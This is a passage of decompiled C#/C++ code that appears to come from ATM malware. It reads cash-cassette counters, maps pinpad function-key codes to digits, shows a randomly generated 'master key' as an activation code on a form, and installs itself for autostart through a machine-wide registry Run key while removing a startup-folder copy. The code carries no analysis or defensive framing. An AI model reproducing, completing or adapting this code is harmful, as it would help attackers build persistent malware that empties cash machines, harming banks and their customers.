		num6 = *(int*)(num * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_NOMINAL, 4)));
		num5 = 40;
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY00_0024_0024CBD_0)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num2);
		if (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_ITEMS_LEFT, 4)) != 0)
		{
			int num15 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_ITEMS_LEFT, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.CU_ITEMS_LEFT, 4)) >> 2;
			if ((uint)num < (uint)num15)
			{
				goto IL_009c;
			}
		}
		_003CModule_003E._invalid_parameter_noinfo();
		goto IL_009c;
	}

	public void setStaticFormObj()
	{
		Globals.myForm = (Form)(object)this;
	}

	private static void AddControlToTheForm(Control item)
	{
		if (((Control)Globals.myForm).get_InvokeRequired())
		{
			AddControlToTheFormThread addControlToTheFormThread = AddControls;
			object[] array = new object[1] { item };
			((Control)Globals.myForm).Invoke((Delegate)addControlToTheFormThread, array);
		}
		else
		{
			AddControls(item);
		}
	}

	private static void AddControls(Control item)
	{
		((Control)Globals.myForm).get_Controls().Add(item);
	}

	private static void RemoveControlFromForm(Control item)
	{
		if (((Control)Globals.myForm).get_InvokeRequired())
		{
			RemoveControlFromFormThread removeControlFromFormThread = RemoveControls;
			object[] array = new object[1] { item };
			((Control)Globals.myForm).Invoke((Delegate)removeControlFromFormThread, array);
		}
		else
		{
			RemoveControls(item);
		}
	}

	private static void RemoveControls(Control item)
	{
		((Control)Globals.myForm).get_Controls().Remove(item);
	}

	private static int getDecimalNumberFromPINFKDigit(uint FK_DIGIT)
	{
		int result = -1;
		switch (FK_DIGIT)
		{
		case 1u:
			result = 0;
			break;
		case 2u:
			result = 1;
			break;
		case 4u:
			result = 2;
			break;
		case 8u:
			result = 3;
			break;
		case 16u:
			result = 4;
			break;
		case 32u:
			result = 5;
			break;
		case 128u:
			result = 7;
			break;
		case 64u:
			result = 6;
			break;
		case 256u:
			result = 8;
			break;
		case 512u:
			result = 9;
			break;
		}
		return result;
	}

	private static int getPINFKDigitFromDecimalNumber(int DECIMAL_NR)
	{
		uint result = uint.MaxValue;
		switch (DECIMAL_NR)
		{
		case 0:
			result = 1u;
			break;
		case 1:
			result = 2u;
			break;
		case 2:
			result = 4u;
			break;
		case 3:
			result = 8u;
			break;
		case 4:
			result = 16u;
			break;
		case 5:
			result = 32u;
			break;
		case 6:
			result = 64u;
			break;
		case 7:
			result = 128u;
			break;
		case 8:
			result = 256u;
			break;
		case 9:
			result = 512u;
			break;
		}
		return (int)result;
	}

	private unsafe static Struct15* GetConvertedPinPadKeys(Struct15* pStruct15_0, Struct15* pinpadKeys)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num);
		try
		{
			num = 0u;
			try
			{
				*(int*)((byte*)pStruct15_0 + 4) = 0;
				*(int*)((byte*)pStruct15_0 + 8) = 0;
				*(int*)((byte*)pStruct15_0 + 12) = 0;
				num = 1u;
				_003CModule_003E.smethod_52(pStruct15_0);
				int num2 = 0;
				if (0 < _003CModule_003E.smethod_49(pinpadKeys))
				{
					Struct15* ptr = (Struct15*)((byte*)pinpadKeys + 4);
					do
					{
						uint num3 = *(uint*)ptr;
						if (num3 != 0)
						{
							int num4 = *(int*)((byte*)pinpadKeys + 8) - (int)num3 >> 2;
							if ((uint)num2 < (uint)num4)
							{
								goto IL_0033;
							}
						}
						_003CModule_003E._invalid_parameter_noinfo();
						goto IL_0033;
						IL_0033:
						uint decimalNumberFromPINFKDigit = (uint)getDecimalNumberFromPINFKDigit(*(uint*)(num2 * 4 + *(int*)ptr));
						_003CModule_003E.smethod_51(pStruct15_0, &decimalNumberFromPINFKDigit);
						num2++;
					}
					while ((uint)num2 < _003CModule_003E.smethod_49(pinpadKeys));
				}
			}
			catch
			{
				//try-fault
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), pinpadKeys);
				throw;
			}
			Struct15* ptr2 = (Struct15*)((byte*)pinpadKeys + 4);
			uint num5 = *(uint*)ptr2;
			if (num5 != 0)
			{
				_003CModule_003E.delete((void*)(int)num5);
			}
			*(int*)ptr2 = 0;
			*(int*)((byte*)pinpadKeys + 8) = 0;
			*(int*)((byte*)pinpadKeys + 12) = 0;
			return pStruct15_0;
		}
		catch
		{
			//try-fault
			if ((num & (true ? 1u : 0u)) != 0)
			{
				num &= 0xFFFFFFFEu;
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), pStruct15_0);
			}
			throw;
		}
	}

	private unsafe static Struct15* GetMasterKeyToPinFK(Struct15* pStruct15_0, Struct15* generatedKey)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num);
		try
		{
			num = 0u;
			try
			{
				*(int*)((byte*)pStruct15_0 + 4) = 0;
				*(int*)((byte*)pStruct15_0 + 8) = 0;
				*(int*)((byte*)pStruct15_0 + 12) = 0;
				num = 1u;
				_003CModule_003E.smethod_52(pStruct15_0);
				int num2 = 0;
				if (0 < _003CModule_003E.smethod_49(generatedKey))
				{
					Struct15* ptr = (Struct15*)((byte*)generatedKey + 4);
					do
					{
						uint num3 = *(uint*)ptr;
						if (num3 != 0)
						{
							int num4 = *(int*)((byte*)generatedKey + 8) - (int)num3 >> 2;
							if ((uint)num2 < (uint)num4)
							{
								goto IL_0033;
							}
						}
						_003CModule_003E._invalid_parameter_noinfo();
						goto IL_0033;
						IL_0033:
						uint pINFKDigitFromDecimalNumber = (uint)getPINFKDigitFromDecimalNumber(*(int*)(num2 * 4 + *(int*)ptr));
						_003CModule_003E.smethod_51(pStruct15_0, &pINFKDigitFromDecimalNumber);
						num2++;
					}
					while ((uint)num2 < _003CModule_003E.smethod_49(generatedKey));
				}
			}
			catch
			{
				//try-fault
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), generatedKey);
				throw;
			}
			Struct15* ptr2 = (Struct15*)((byte*)generatedKey + 4);
			uint num5 = *(uint*)ptr2;
			if (num5 != 0)
			{
				_003CModule_003E.delete((void*)(int)num5);
			}
			*(int*)ptr2 = 0;
			*(int*)((byte*)generatedKey + 8) = 0;
			*(int*)((byte*)generatedKey + 12) = 0;
			return pStruct15_0;
		}
		catch
		{
			//try-fault
			if ((num & (true ? 1u : 0u)) != 0)
			{
				num &= 0xFFFFFFFEu;
				_003CModule_003E.___CxxCallUnwindDtor((delegate*<void*, void>)(delegate*<Struct15*, void>)(&_003CModule_003E.smethod_47), pStruct15_0);
			}
			throw;
		}
	}

	private unsafe static void PrintCode_()
	{
		Color white = Color.White;
		((Control)Globals.infoLabel[0]).set_ForeColor(white);
		Globals.infoLabel[0].set_Text("CODE: ");
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _0024ArrayType_0024_0024_0024BY01D _0024ArrayType_0024_0024_0024BY01D);
		System.Runtime.CompilerServices.Unsafe.As<_0024ArrayType_0024_0024_0024BY01D, sbyte>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _0024ArrayType_0024_0024_0024BY01D, 1)) = 0;
		int num = 0;
		while (System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_RANDOM_KEY, 4)) != 0)
		{
			int num2 = System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_RANDOM_KEY, 8)) - System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_RANDOM_KEY, 4)) >> 2;
			int num3 = num2;
			if ((uint)num < (uint)num3)
			{
				int num4 = num2;
				if ((uint)num >= (uint)num4)
				{
					_003CModule_003E._invalid_parameter_noinfo();
				}
				*(sbyte*)(&_0024ArrayType_0024_0024_0024BY01D) = (sbyte)(*(int*)(num * 4 + System.Runtime.CompilerServices.Unsafe.As<Struct15, int>(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref _003CModule_003E.MKEY_RANDOM_KEY, 4))) + 48);
				Globals.infoLabel[0].set_Text(Globals.infoLabel[0].get_Text() + new string((sbyte*)(&_0024ArrayType_0024_0024_0024BY01D)));
				num++;
				continue;
			}
			break;
		}
	}

	private static void PrintCode()
	{
		if (((Control)Globals.infoLabel[0]).get_InvokeRequired())
		{
			PrintCodeThread printCodeThread = PrintCode_;
			((Control)Globals.infoLabel[0]).Invoke((Delegate)printCodeThread);
		}
		else
		{
			PrintCode_();
		}
	}

	private static void PrintInfo_(Control item, string text, Color color)
	{
		item.set_ForeColor(color);
		item.set_Text(text);
	}

	private static void PrintInfo(Control item, string text, Color color)
	{
		if (item.get_InvokeRequired())
		{
			PrintInfoThread printInfoThread = PrintInfo_;
			item.Invoke((Delegate)printInfoThread, new object[3] { item, text, color });
		}
		else
		{
			PrintInfo_(item, text, color);
		}
	}

	[return: MarshalAs(UnmanagedType.U1)]
	private unsafe bool setAutoStartUpRegistry()
	{
		Struct65 struct33_ = (Struct65)_003CModule_003E.struct33_0;
		Struct66 struct41_ = (Struct66)_003CModule_003E.struct41_0;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct71 @struct);
		*(short*)(&@struct) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 2), 0, 518);
		Struct71* ptr = (Struct71*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.SYS);
		Struct71* ptr2 = &@struct;
		if (*(short*)(&@struct) != 0)
		{
			do
			{
				ptr2 = (Struct71*)((byte*)ptr2 + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr2) != 0);
		}
		if (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr2, System.Runtime.CompilerServices.Unsafe.As<Struct71, short>(ref _003CModule_003E.SYS)) != 0)
		{
			do
			{
				ptr2 = (Struct71*)((byte*)ptr2 + 2);
				ptr = (Struct71*)((byte*)ptr + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr2, System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr)) != 0);
		}
		char* ptr3 = (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct34_1);
		Struct71* ptr4 = &@struct;
		if (*(short*)(&@struct) != 0)
		{
			do
			{
				ptr4 = (Struct71*)((byte*)ptr4 + 2);
			}
			while (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr4) != 0);
		}
		System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr4, (short)92);
		do
		{
			ptr4 = (Struct71*)((byte*)ptr4 + 2);
			ptr3++;
		}
		while (System.Runtime.CompilerServices.Unsafe.WriteUnaligned(ptr4, System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr3)) != 0);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out HKEY__* ptr5);
		if (_003CModule_003E.RegOpenKeyExW((HKEY__*)(-2147483646), (char*)(&struct33_), 0u, 983103u, &ptr5) == 0)
		{
			if (ptr5 != null)
			{
				Struct71* ptr6 = &@struct;
				if (*(short*)(&@struct) != 0)
				{
					do
					{
						ptr6 = (Struct71*)((byte*)ptr6 + 2);
					}
					while (System.Runtime.CompilerServices.Unsafe.ReadUnaligned<short>(ptr6) != 0);
				}
				uint num = (uint)((nint)((ref *(_003F*)ptr6) - (ref *(_003F*)(&@struct))) >> 1);
				int num2 = _003CModule_003E.RegSetValueExW(ptr5, (char*)(&struct41_), 0u, 1u, (byte*)(&@struct), num * 2 + 2);
				_003CModule_003E.RegCloseKey(ptr5);
				if (num2 != 0)
				{
					goto IL_0111;
				}
			}
			DeleteStartupFolderFile((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct70_0));
			return true;
		}
		goto IL_0111;
		IL_0111:
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_122(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct42_0)), _003CModule_003E.GetLastError()), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)_003CModule_003E.ppInt_2);
		return false;
	}

	private unsafe int DeleteStartupFolderFile(sbyte* fileName)
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct67 @struct);
		*(sbyte*)(&@struct) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref @struct, 1), 0, 259);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct71 struct2);
		*(short*)(&struct2) = 0;
		// IL initblk instruction
		System.Runtime.CompilerServices.Unsafe.InitBlock(ref System.Runtime.CompilerServices.Unsafe.AddByteOffset(ref struct2, 2), 0, 518);
		_003CModule_003E.wcstombs((sbyte*)(&@struct), (char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.STARTUP), 260u);
		sbyte* ptr = fileName;
		sbyte* ptr2 = (sbyte*)(&@struct);
		if (*(bool*)(&@struct))
		{
			do
			{
				ptr2++;
			}
			while (*ptr2 != 0);
		}
		if ((*ptr2 = *fileName) != 0)
		{
			do
			{
				ptr2++;
				ptr++;
			}
			while ((*ptr2 = *ptr) != 0);
		}
		int num = (int)_003CModule_003E.ppInt_2;
		_003CModule_003E.smethod_117(_003CModule_003E.smethod_95(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct28_2)), (sbyte*)(&@struct)), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		_003CModule_003E.mbstowcs((char*)(&struct2), (sbyte*)(&@struct), 260u);
		_003CModule_003E.SetFileAttributesW((char*)(&struct2), 128u);
		int num2 = _003CModule_003E.remove((sbyte*)(&@struct));
		if (num2 == 0)
		{
			_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct6_0));
		}
		else
		{
			_003CModule_003E.smethod_117(_003CModule_003E.smethod_122(_003CModule_003E.smethod_95((Struct54*)(int)System.Runtime.CompilerServices.Unsafe.As<Struct54*, uint>(ref _003CModule_003E.__imp_std_002Ecout), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct43_0)), _003CModule_003E.GetLastError()), (delegate* unmanaged[Cdecl, Cdecl]<Struct54*, Struct54*>)num);
		}
		return num2;
	}

	public unsafe static void GetNeededFolderPath(int FOLDER_ID, char* @out)
	{
		if (_003CModule_003E.SHGetFolderPathW(null, FOLDER_ID, null, 0u, @out) >= 0)
		{
			_003CModule_003E.wprintf((char*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E._0024ArrayType_0024_0024_0024BY02_0024_0024CB_W_0), __arglist((ushort*)@out));
		}
	}

	protected override void Dispose([MarshalAs(UnmanagedType.U1)] bool disposing)
	{
		if (disposing)
		{
			try
			{
				method_0();
				return;
			}
			finally
			{
				((Form)this).Dispose(true);
			}
		}
		((Form)this).Dispose(false);
	}
}
